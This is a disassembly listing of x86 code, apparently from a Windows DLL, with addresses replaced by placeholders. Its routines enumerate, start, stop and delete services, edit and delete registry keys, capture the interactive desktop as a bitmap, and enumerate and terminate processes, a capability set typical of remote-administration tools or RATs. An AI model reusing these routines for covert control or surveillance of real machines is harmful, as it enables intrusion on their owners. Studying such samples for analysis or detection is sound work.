call [ LeaveCriticalSection@IAT ]
pop ebx
sub_1000d32b
push ebp
mov ebp esp
push ecx
push ebx
push edi
lea ebx [ esi + 0x14 ]
xor edi edi
push ebx
mov [ ebp - 0x4 ] edi
call [ EnterCriticalSection@IAT ]
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
test edi edi
jne r-xdata
mov edi eax
mov eax [ edi + 0x8 ]
mov [ esi + 0x10 ] eax
mov eax [ edi + 0x4 ]
dec eax
je r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
call sub_1000e0cc
dec eax
je r-xdata
pop edi
pop ebx
leave
retn
mov ecx edi
call sub_1000d39b
jmp r-xdata
dec eax
je r-xdata
mov [ ebp - 0x4 ] eax
push edi
call sub_1000d731
jmp r-xdata
dec eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ edi + 0x10 ]
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x8 ] eax
jmp r-xdata
sub_1000d39b
push ebp
mov ebp esp
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi + 0x10 ]
xor esi esi
sub eax esi
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x2c ] esi
je r-xdata
push 0x80000000
push esi
push esi
call [ OpenSCManagerA@IAT ]
mov [ ebp - 0x28 ] eax
cmp eax esi
je r-xdata
dec eax
je r-xdata
push 0x8
pop ebx
push esi
lea ecx [ ebp - 0x24 ]
push ecx
lea ecx [ ebp - 0x34 ]
push ecx
push esi
push esi
push 0x3
push 0x30
push eax
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x24 ] esi
call [ EnumServicesStatusA@IAT ]
test eax eax
jne r-xdata
push 0x20000000
push esi
push esi
call [ OpenSCManagerA@IAT ]
mov [ ebp - 0x28 ] eax
cmp eax esi
je r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x2c ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
mov eax ebx
call sub_1000737c
push edi
mov ebx eax
push ebx
push esi
call [ GetLastError@IAT ]
mov ebx eax
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x24 ] eax
push 0x10
lea ecx [ edi + 0x14 ]
push ecx
push eax
call [ OpenServiceW@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x20000000
push esi
push esi
call [ OpenSCManagerA@IAT ]
mov [ ebp - 0x30 ] eax
cmp eax esi
je r-xdata
dec eax
jne r-xdata
cmp [ ebp - 0x2c ] esi
jne r-xdata
push [ ebp - 0x34 ]
mov ebx [ malloc@IAT ]
call ebx
pop ecx
mov [ ebp - 0x30 ] eax
cmp eax esi
je r-xdata
call sub_1000d110
push ebx
mov [ ebp - 0x2c ] eax
call [ LocalFree@IAT ]
call [ GetLastError@IAT ]
mov [ ebp - 0x24 ] eax
push esi
push esi
push ebx
call [ StartServiceW@IAT ]
test eax eax
je r-xdata
push 0x20
lea ecx [ edi + 0x14 ]
push ecx
push eax
call [ OpenServiceW@IAT ]
mov ebx [ CloseServiceHandle@IAT ]
mov [ ebp - 0x28 ] eax
cmp eax esi
je r-xdata
push 0x20000000
push esi
push esi
call [ OpenSCManagerA@IAT ]
mov [ ebp - 0x30 ] eax
cmp eax esi
je r-xdata
push 0x8
pop ebx
jmp r-xdata
push esi
lea ecx [ ebp - 0x24 ]
push ecx
lea ecx [ ebp - 0x34 ]
push ecx
push [ ebp - 0x34 ]
push eax
push 0x3
push 0x30
push [ ebp - 0x28 ]
call [ EnumServicesStatusW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
call sub_1000737c
cmp [ ebp - 0x24 ] esi
mov ebx eax
sete al
push edi
movzx eax al
push ebx
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x24 ] esi
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x24 ] eax
lea ecx [ ebp - 0x20 ]
push ecx
push 0x1
push eax
call [ ControlService@IAT ]
jmp r-xdata
push 0x10
lea ecx [ edi + 0x14 ]
push ecx
push eax
call [ OpenServiceW@IAT ]
mov ebx [ CloseServiceHandle@IAT ]
mov [ ebp - 0x28 ] eax
cmp eax esi
je r-xdata
push [ ebp - 0x28 ]
call [ CloseServiceHandle@IAT ]
jmp r-xdata
call [ GetLastError@IAT ]
mov ebx eax
mov edi [ ebp - 0x24 ]
imul edi edi 0x21c
add edi 0x618
push edi
call ebx
mov ebx eax
pop ecx
mov [ ebp - 0x2c ] ebx
cmp ebx esi
je r-xdata
push [ ebp - 0x28 ]
call [ CloseServiceHandle@IAT ]
jmp r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
jmp r-xdata
test eax eax
je r-xdata
push eax
call [ DeleteService@IAT ]
push 0x8
pop ebx
push edi
push esi
push ebx
call [ memset@IAT ]
mov eax [ ebp - 0x24 ]
imul eax eax 0x21c
add eax 0x618
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x2
mov [ ebx + 0x10 ] esi
mov eax [ ebp - 0x24 ]
add esp 0xc
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x38 ] esi
cmp [ ebp - 0x24 ] esi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x24 ] esi
jmp r-xdata
push [ ebp - 0x30 ]
call [ free@IAT ]
pop ecx
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov esi [ ebp - 0x30 ]
add esi 0x8
mov [ ebp - 0x3c ] esi
add ebx 0x116
jmp r-xdata
push [ ebp - 0x30 ]
call ebx
jmp r-xdata
push [ ebp - 0x28 ]
call ebx
jmp r-xdata
mov edi [ ebp - 0x40 ]
jmp r-xdata
mov edi [ wcsncpy@IAT ]
push 0x80
push [ esi - 0x8 ]
lea eax [ ebx - 0xfe ]
push eax
call edi
xor eax eax
mov [ ebx ] ax
push 0x80
push [ esi - 0x4 ]
lea eax [ ebx + 0x2 ]
push eax
call edi
add [ ebp - 0x3c ] 0x24
add esp 0x18
xor eax eax
inc [ ebp - 0x38 ]
mov [ ebx + 0x100 ] ax
mov eax [ ebp - 0x38 ]
push 0x7
lea edi [ ebx + 0x102 ]
pop ecx
[ edi ] [ esi ]
add ebx 0x21c
cmp eax [ ebp - 0x24 ]
jb r-xdata
mov esi [ ebp - 0x3c ]
xor esi esi
sub_1000d6af
push esi
mov esi [ _wcsicmp@IAT ]
push r--data
push ebx
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
push edi
mov edi r--data
push edi
push ebx
call esi
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax 0x80000000
pop esi
retn
mov eax 0x80000001
jmp r-xdata
push r--data
push ebx
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
pop edi
pop esi
retn
push r--data
push ebx
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax 0x80000002
jmp r-xdata
push edi
push ebx
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax 0x80000003
jmp r-xdata
push r--data
push ebx
call esi
neg eax
sbb eax eax
pop ecx
and eax 0x7ffffffb
pop ecx
add eax 0x80000005
sub_1000d731
push ebp
mov ebp esp
sub esp 0x248
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ wcschr@IAT ]
push esi
push edi
mov [ ebp - 0x228 ] eax
add eax 0x14
push 0x5c
xor edi edi
push eax
xor esi esi
mov [ ebp - 0x210 ] edi
mov [ ebp - 0x21c ] eax
call ebx
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x214 ] edi
mov ebx esi
push 0x5c
push [ ebp - 0x21c ]
call ebx
pop ecx
lea ebx [ eax + 0x2 ]
pop ecx
mov [ ebp - 0x214 ] ebx
jmp r-xdata
push 0x104
push [ ebp - 0x21c ]
push eax
call [ wcsncpy@IAT ]
add esp 0xc
xor eax eax
mov [ ebp - 0x6 ] ax
push 0x208
push edi
push eax
call [ memset@IAT ]
sub ebx [ ebp - 0x228 ]
lea eax [ ebp - 0x20c ]
sub ebx 0x16
sar ebx 0x1
push ebx
push [ ebp - 0x21c ]
push eax
call [ wcsncpy@IAT ]
add esp 0x18
jmp r-xdata
lea eax [ ebp - 0x20c ]
cmp ebx edi
je r-xdata
mov ebx [ ebp - 0x228 ]
mov ecx [ ebx + 0x10 ]
sub ecx edi
je r-xdata
xor eax eax
jmp r-xdata
lea ebx [ ebp - 0x20c ]
call sub_1000d6af
cmp eax edi
jne r-xdata
lea ecx [ ebp - 0x210 ]
push ecx
push 0x20019
push edi
push [ ebp - 0x214 ]
push eax
call [ RegOpenKeyExW@IAT ]
mov [ ebp - 0x21c ] eax
cmp eax edi
jne r-xdata
dec ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn 0x4
mov eax [ ebp - 0x21c ]
call sub_1000737c
push ebx
push eax
push edi
mov [ ebp - 0x23c ] eax
call sub_1000d110
push [ ebp - 0x23c ]
push edi
push edi
lea eax [ ebp - 0x218 ]
push eax
lea eax [ ebp - 0x244 ]
push eax
lea eax [ ebp - 0x238 ]
push eax
push edi
lea eax [ ebp - 0x240 ]
push eax
lea eax [ ebp - 0x234 ]
push eax
push edi
push edi
push edi
push [ ebp - 0x210 ]
call [ RegQueryInfoKeyA@IAT ]
mov [ ebp - 0x21c ] eax
cmp eax edi
jne r-xdata
lea ecx [ ebp - 0x210 ]
push ecx
push 0x20019
push edi
push [ ebp - 0x214 ]
push eax
call [ RegOpenKeyExW@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
dec ecx
je r-xdata
push [ ebp - 0x210 ]
call [ RegCloseKey@IAT ]
cmp esi edi
jne r-xdata
mov eax [ ebp - 0x238 ]
mov ecx [ ebp - 0x234 ]
lea eax [ ecx + eax + 0x2 ]
imul eax eax 0x30c
push eax
call sub_10007c8b
mov ebx [ LocalAlloc@IAT ]
mov esi eax
mov eax [ ebp - 0x240 ]
pop ecx
lea eax [ eax + eax + 0x2 ]
push eax
push 0x40
call ebx
mov [ ebp - 0x230 ] eax
mov eax [ ebp - 0x244 ]
lea eax [ eax + eax + 0x2 ]
push eax
push 0x40
call ebx
mov [ ebp - 0x22c ] eax
mov eax [ ebp - 0x218 ]
add eax 0x2
push eax
push 0x40
call ebx
mov [ ebp - 0x220 ] eax
cmp esi edi
je r-xdata
mov eax esi
call sub_1000737c
push ebx
push eax
mov [ ebp - 0x218 ] eax
cmp esi edi
sete al
movzx eax al
push eax
push edi
lea eax [ ebp - 0x218 ]
push eax
push edi
push 0xf003f
push edi
push edi
push edi
lea eax [ ebx + 0x214 ]
push eax
push [ ebp - 0x210 ]
call [ RegCreateKeyExW@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
xor eax eax
inc eax
call sub_1000737c
push ebx
push eax
mov [ ebp - 0x218 ] eax
push edi
jmp r-xdata
dec ecx
je r-xdata
mov eax esi
mov [ ebp - 0x21c ] 0x8
cmp [ ebp - 0x230 ] edi
je r-xdata
mov esi eax
call [ LocalFree@IAT ]
push [ ebp - 0x210 ]
call [ RegCloseKey@IAT ]
push [ ebp - 0x218 ]
call [ RegCloseKey@IAT ]
jmp r-xdata
call sub_1000d110
push [ ebp - 0x218 ]
jmp r-xdata
cmp [ ebx + 0x214 ] di
je r-xdata
dec ecx
je r-xdata
cmp [ ebp - 0x22c ] edi
je r-xdata
push 0x57
pop esi
jmp r-xdata
lea ecx [ ebp - 0x210 ]
push ecx
push 0x20019
push edi
push [ ebp - 0x214 ]
push eax
call [ RegOpenKeyExW@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
lea ecx [ ebp - 0x210 ]
push ecx
push 0x20006
push edi
push [ ebp - 0x214 ]
push eax
call [ RegOpenKeyExW@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
dec ecx
je r-xdata
cmp eax edi
je r-xdata
lea eax [ ebx + 0x214 ]
push eax
push [ ebp - 0x210 ]
call [ SHDeleteKeyW@IAT ]
jmp r-xdata
push [ ebx + 0x418 ]
lea eax [ ebx + 0x41c ]
push eax
push [ ebx + 0x414 ]
lea eax [ ebx + 0x214 ]
jmp r-xdata
lea ecx [ ebp - 0x210 ]
push ecx
push 0x20006
push edi
push [ ebp - 0x214 ]
push eax
call [ RegOpenKeyExW@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
dec ecx
jne r-xdata
mov [ esi + 0x4 ] 0x3
mov eax [ ebp - 0x238 ]
mov ecx [ ebp - 0x234 ]
lea eax [ ecx + eax + 0x2 ]
imul eax eax 0x30c
mov [ esi ] eax
mov eax [ ebp - 0x228 ]
mov ebx 0x100
add eax 0x14
push ebx
push eax
lea eax [ esi + 0x14 ]
push eax
mov [ ebp - 0x21c ] edi
mov [ esi + 0x10 ] edi
call [ wcsncpy@IAT ]
xor eax eax
add esp 0xc
mov [ esi + 0x212 ] ax
mov [ ebp - 0x214 ] edi
cmp [ ebp - 0x234 ] edi
jbe r-xdata
mov esi eax
push edi
push eax
push [ ebp - 0x210 ]
call [ RegSetValueExW@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x21c ]
push ecx
push edi
lea ecx [ ebp - 0x220 ]
push ecx
push edi
lea eax [ ebx + 0x214 ]
push eax
push [ ebp - 0x210 ]
call [ RegQueryValueExW@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
lea ecx [ ebp - 0x210 ]
push ecx
push 0x20006
push edi
push [ ebp - 0x214 ]
push eax
call [ RegOpenKeyExW@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
mov [ ebp - 0x214 ] edi
cmp [ ebp - 0x238 ] edi
jbe r-xdata
mov eax [ ebp - 0x240 ]
push edi
push edi
push edi
inc eax
push edi
mov [ ebp - 0x224 ] eax
lea eax [ ebp - 0x224 ]
push eax
push [ ebp - 0x230 ]
push [ ebp - 0x214 ]
push [ ebp - 0x210 ]
call [ RegEnumKeyExW@IAT ]
cmp eax edi
jne r-xdata
push [ ebp - 0x21c ]
push 0x40
call [ LocalAlloc@IAT ]
mov [ ebp - 0x218 ] eax
cmp eax edi
jne r-xdata
lea eax [ ebx + 0x214 ]
push eax
push [ ebp - 0x210 ]
call [ RegDeleteValueW@IAT ]
push [ ebp - 0x230 ]
mov ebx [ LocalFree@IAT ]
call ebx
push [ ebp - 0x22c ]
call ebx
push [ ebp - 0x220 ]
call ebx
jmp r-xdata
mov eax [ ebp - 0x218 ]
lea ecx [ eax + 0x1 ]
add eax 0x2
mov [ ebp - 0x224 ] eax
lea eax [ ebp - 0x224 ]
push eax
push [ ebp - 0x220 ]
lea eax [ ebp - 0x23c ]
push eax
push edi
lea eax [ ebp - 0x248 ]
push eax
push [ ebp - 0x22c ]
mov [ ebp - 0x248 ] ecx
push [ ebp - 0x214 ]
push [ ebp - 0x210 ]
call [ RegEnumValueW@IAT ]
cmp eax edi
jne r-xdata
cmp eax 0x103
je r-xdata
mov eax [ esi + 0x214 ]
imul eax eax 0x30c
mov [ eax + esi + 0x218 ] 0x1
mov eax [ esi + 0x214 ]
imul eax eax 0x30c
push ebx
push [ ebp - 0x230 ]
lea eax [ eax + esi + 0x21c ]
push eax
call [ wcsncpy@IAT ]
mov eax [ esi + 0x214 ]
imul eax eax 0x30c
xor ecx ecx
add esp 0xc
mov [ eax + esi + 0x41a ] cx
inc [ esi + 0x214 ]
jmp r-xdata
lea ecx [ ebp - 0x21c ]
push ecx
push eax
lea eax [ ebp - 0x220 ]
push eax
push edi
lea eax [ ebx + 0x214 ]
push eax
push [ ebp - 0x210 ]
call [ RegQueryValueExW@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
push 0x8
pop esi
jmp r-xdata
mov ebx [ ebp - 0x228 ]
cmp eax 0x103
je r-xdata
mov eax [ esi + 0x214 ]
imul eax eax 0x30c
mov [ eax + esi + 0x218 ] edi
mov eax [ esi + 0x214 ]
imul eax eax 0x30c
push ebx
push [ ebp - 0x22c ]
lea eax [ eax + esi + 0x21c ]
push eax
call [ wcsncpy@IAT ]
mov eax [ esi + 0x214 ]
imul eax eax 0x30c
xor ecx ecx
mov [ eax + esi + 0x41a ] cx
mov eax [ esi + 0x214 ]
mov ecx [ ebp - 0x23c ]
imul eax eax 0x30c
mov [ eax + esi + 0x41c ] ecx
mov eax [ esi + 0x214 ]
mov ecx [ ebp - 0x224 ]
imul eax eax 0x30c
mov [ eax + esi + 0x420 ] ecx
mov eax [ ebp - 0x224 ]
add esp 0xc
cmp eax ebx
jb r-xdata
inc [ ebp - 0x214 ]
mov eax [ ebp - 0x214 ]
cmp eax [ ebp - 0x234 ]
jb r-xdata
lea eax [ ebx + 0x214 ]
push eax
push [ ebp - 0x210 ]
call [ RegDeleteValueW@IAT ]
push [ ebp - 0x21c ]
lea eax [ ebx + 0x414 ]
push [ ebp - 0x218 ]
push [ ebp - 0x220 ]
inc [ ebp - 0x214 ]
mov eax [ ebp - 0x214 ]
cmp eax [ ebp - 0x238 ]
jb r-xdata
push eax
mov eax [ esi + 0x214 ]
push [ ebp - 0x220 ]
imul eax eax 0x30c
lea eax [ eax + esi + 0x424 ]
push eax
call [ memcpy@IAT ]
add esp 0xc
inc [ esi + 0x214 ]
jmp r-xdata
mov eax ebx
sub_1000de30
push ebp
mov ebp esp
sub esp 0x68
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0xc ]
xor edi edi
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x28 ] edi
call [ GetProcessWindowStation@IAT ]
mov [ ebp - 0x3c ] eax
call [ GetCurrentThreadId@IAT ]
push eax
call [ GetThreadDesktop@IAT ]
mov esi __dos_header
push esi
push edi
push r--data
mov [ ebp - 0x50 ] eax
call [ OpenWindowStationA@IAT ]
mov [ ebp - 0x44 ] eax
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x28 ]
pop edi
xor ecx ebp
pop esi
call sub_10014571
leave
retn 0x8
push eax
call [ SetProcessWindowStation@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x44 ]
call [ CloseWindowStation@IAT ]
push esi
push edi
push edi
call [ OpenInputDesktop@IAT ]
mov [ ebp - 0x34 ] eax
cmp eax edi
je r-xdata
push [ ebp - 0x3c ]
call [ SetProcessWindowStation@IAT ]
push eax
call [ SetThreadDesktop@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x34 ]
call [ CloseDesktop@IAT ]
call [ GetDesktopWindow@IAT ]
mov [ ebp - 0x2c ] eax
cmp eax edi
je r-xdata
push [ ebp - 0x50 ]
call [ SetThreadDesktop@IAT ]
push ebx
lea ecx [ ebp - 0x14 ]
push ecx
push eax
call [ GetWindowRect@IAT ]
mov esi [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
push [ ebp - 0x2c ]
sub esi [ ebp - 0x14 ]
sub ebx [ ebp - 0x10 ]
call [ GetWindowDC@IAT ]
push eax
mov [ ebp - 0x1c ] eax
call [ CreateCompatibleDC@IAT ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] edi
jne r-xdata
cmp eax edi
je r-xdata
cmp eax edi
je r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
push ebx
push esi
push [ ebp - 0x1c ]
call [ CreateCompatibleBitmap@IAT ]
mov [ ebp - 0x24 ] eax
cmp eax edi
je r-xdata
pop ebx
jmp r-xdata
push [ ebp - 0x1c ]
push [ ebp - 0x2c ]
call [ ReleaseDC@IAT ]
push [ ebp - 0x20 ]
call [ DeleteDC@IAT ]
push eax
push [ ebp - 0x20 ]
call [ SelectObject@IAT ]
push 0xcc0020
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
push eax
push edi
push edi
push [ ebp - 0x1c ]
push ebx
push esi
push edi
push edi
push [ ebp - 0x20 ]
call [ StretchBlt@IAT ]
push [ ebp - 0x18 ]
push [ ebp - 0x20 ]
call [ SelectObject@IAT ]
lea eax [ ebp - 0x68 ]
push eax
push 0x18
push [ ebp - 0x24 ]
call [ GetObjectA@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x24 ]
call [ DeleteObject@IAT ]
mov eax [ ebp - 0x64 ]
lea eax [ eax * 8 + 0x1f ]
and eax 0xffffffe0
cdq
and edx 0x7
lea ebx [ edx + eax ]
sar ebx 0x3
imul ebx [ ebp - 0x60 ]
lea eax [ ebx + 0x438 ]
push eax
mov [ ebp - 0x48 ] eax
call sub_10007c8b
mov esi eax
pop ecx
cmp esi edi
je r-xdata
mov [ esi ] 0x28
mov eax [ ebp - 0x64 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x60 ]
mov [ esi + 0x8 ] eax
xor eax eax
inc eax
push 0x8
mov [ esi + 0xc ] ax
pop eax
push edi
mov [ esi + 0x10 ] edi
mov [ esi + 0xe ] ax
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] 0x100
mov [ esi + 0x14 ] ebx
mov [ esi + 0x24 ] edi
call [ GetDC@IAT ]
push 0xf
mov [ ebp - 0x18 ] eax
call [ GetStockObject@IAT ]
mov ebx [ SelectPalette@IAT ]
push edi
push eax
push [ ebp - 0x18 ]
call ebx
push [ ebp - 0x18 ]
mov [ ebp - 0x38 ] eax
call [ RealizePalette@IAT ]
push edi
push esi
lea eax [ esi + 0x428 ]
push eax
push [ ebp - 0x60 ]
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x18 ]
call [ GetDIBits@IAT ]
push 0x1
push [ ebp - 0x38 ]
mov [ ebp - 0x4c ] eax
push [ ebp - 0x18 ]
call ebx
push [ ebp - 0x18 ]
call [ RealizePalette@IAT ]
push [ ebp - 0x18 ]
push edi
call [ ReleaseDC@IAT ]
cmp [ ebp - 0x4c ] edi
jne r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x40 ]
mov [ eax ] esi
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x28 ] 0x1
mov [ ecx ] eax
push esi
call [ free@IAT ]
pop ecx
jmp r-xdata
sub_1000e0cc
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
push edi
xor edi edi
xor ebx ebx
sub eax edi
mov [ ebp - 0x20c ] edi
je r-xdata
mov [ ebp - 0x208 ] edi
mov [ ebp - 0x20c ] edi
dec eax
jne r-xdata
mov eax 0xc00000a0
push edi
push [ ebp - 0x208 ]
push esi
push 0x5
call [ ZwQuerySystemInformation@IAT ]
cmp eax 0xc0000004
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
push [ esi + 0x14 ]
push edi
push 0x1
call [ OpenProcess@IAT ]
mov ebx eax
cmp ebx edi
je r-xdata
mov [ ebp - 0x208 ] edi
mov eax esi
cmp esi edi
je r-xdata
add [ ebp - 0x208 ] 0x1000
push [ ebp - 0x208 ]
push [ ebp - 0x20c ]
call [ realloc@IAT ]
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0x20c ] esi
cmp esi edi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x20c ]
call sub_1000737c
cmp [ ebp - 0x20c ] edi
push esi
push eax
mov [ ebp - 0x208 ] eax
sete al
movzx eax al
push eax
call sub_1000d110
push [ ebp - 0x208 ]
mov ebx eax
call [ LocalFree@IAT ]
jmp r-xdata
push edi
push ebx
call [ TerminateProcess@IAT ]
test eax eax
je r-xdata
mov ecx [ eax ]
cmp ecx edi
je r-xdata
cmp [ eax + 0x44 ] edi
je r-xdata
push esi
jmp r-xdata
cmp eax edi
jge r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x20c ] edi
jmp r-xdata
mov esi [ ebp - 0x208 ]
imul esi esi 0x188
add esi 0x618
push esi
call [ malloc@IAT ]
mov ebx eax
pop ecx
cmp ebx edi
je r-xdata
add eax ecx
jne r-xdata
inc [ ebp - 0x208 ]
call [ free@IAT ]
pop ecx
push ebx
call [ CloseHandle@IAT ]
push [ ebp - 0x20c ]
push esi
push edi
push ebx
call [ memset@IAT ]
mov eax [ ebp - 0x208 ]
mov [ ebx ] esi
mov [ ebx + 0x10 ] edi
mov edi [ ebp - 0x20c ]
add esp 0xc
mov [ ebx + 0x4 ] 0x1
mov [ ebx + 0x14 ] eax
lea esi [ ebx + 0x116 ]
cmp [ eax + 0x3c ] edi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push eax
push 0x0
push 0x410
call [ OpenProcess@IAT ]
mov [ ebp - 0x208 ] eax
test eax eax
je r-xdata
add edi eax
jne r-xdata
movzx ecx [ edi + 0x38 ]
mov eax 0x80
cmp ax cx
jb r-xdata
push 0xff
lea ecx [ ebp - 0x204 ]
push ecx
push 0x0
push eax
call [ GetModuleFileNameExW@IAT ]
test eax eax
je r-xdata
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
push eax
push [ edi + 0x3c ]
lea eax [ esi - 0xfe ]
push eax
call [ wcsncpy@IAT ]
add esp 0xc
xor eax eax
mov [ esi ] ax
mov eax ecx
movzx ecx [ edi + 0x38 ]
mov eax 0x80
cmp ax cx
jb r-xdata
xor eax eax
mov [ ebp - 0x8 ] ax
push 0x80
lea eax [ ebp - 0x204 ]
push eax
jmp r-xdata
push eax
push [ edi + 0x3c ]
mov eax ecx
lea eax [ esi - 0xfe ]
push eax
call [ wcsncpy@IAT ]
add esp 0xc
push [ ebp - 0x208 ]
xor eax eax
mov [ esi ] ax
call [ CloseHandle@IAT ]
jmp r-xdata
mov eax [ edi + 0x44 ]
mov [ esi + 0x82 ] eax
mov eax [ edi + 0x50 ]
mov [ esi + 0x86 ] eax
push [ edi + 0x44 ]
lea ecx [ esi + 0x2 ]
call sub_10007546
pop ecx
add esi 0x188
sub_1000e346
push 0x50
mov eax sub_100151b4
call sub_10015135
mov eax [ ebp + 0x8 ]
mov esi r--data
xor ebx ebx
push esi
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x40 ] ebx
call [ GetModuleHandleA@IAT ]
cmp eax ebx
jne r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
cmp eax ebx
je r-xdata
push esi
call [ LoadLibraryA@IAT ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x40 ]
call sub_1001517f
retn
push ebx
push ebx
push ebx
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] ebx
push ecx
mov [ ebp - 0x38 ] ebx
call eax
cmp eax ebx
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x38 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x3c ] ebx
cmp eax ebx
jne r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov ecx [ eax ]
lea edx [ ebp - 0x3c ]
push edx
push ebx
push ebx
push eax
mov esi eax
call [ ecx + 0x38 ]
cmp eax ebx
jge r-xdata
push 0x80004003
call sub_100143e0
cmp [ ebp - 0x3c ] ebx
jne r-xdata
push r--data
push esi
push eax
call sub_10014400
mov eax [ ebp - 0x3c ]
mov eax [ eax ]
push ebx
lea ecx [ ebp - 0x24 ]
push ecx
push 0x1
push [ ebp - 0x3c ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ ebp - 0x4 ] bl
mov eax [ ebp - 0x3c ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x48 ] ebx
cmp eax ebx
je r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x48 ]
push edx
push ebx
lea edx [ ebp - 0x24 ]
push edx
push ebx
push eax
mov edi eax
call [ ecx + 0x3c ]
mov esi eax
cmp esi ebx
jge r-xdata
jne r-xdata
push r--data
push edi
push esi
call sub_10014400
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x48 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x48 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov ecx [ eax ]
push ebx
lea edx [ ebp - 0x34 ]
push edx
push 0x1
push eax
call [ ecx + 0xc ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x4c ] ebx
cmp eax ebx
je r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x4c ]
push edx
push ebx
lea edx [ ebp - 0x34 ]
push edx
lea edx [ ebp - 0x24 ]
push edx
push ebx
push eax
mov esi eax
call [ ecx + 0x54 ]
cmp eax ebx
jge r-xdata
mov eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x5c ]
imul eax eax 0x128
lea eax [ eax + ecx + 0x20 ]
push r--data
push esi
push eax
call sub_10014400
mov ecx [ eax ]
push ebx
lea edx [ ebp - 0x58 ]
push edx
push 0x1
push eax
call [ ecx + 0xc ]
test eax eax
jne r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
